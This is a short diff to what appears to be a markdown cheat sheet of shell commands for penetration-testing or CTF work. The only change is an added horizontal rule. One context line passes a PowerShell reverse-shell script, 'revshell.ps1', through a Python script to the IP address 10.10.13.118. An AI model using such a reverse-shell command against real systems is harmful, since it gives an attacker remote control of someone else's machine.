@@ -44,6 +44,7 @@ sort data.txt | uniq -u #uniq lines
 cat .download.dat | xxd -r -p #like strings
 ```
 
+---
 #### if command to long
 ```python
 python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
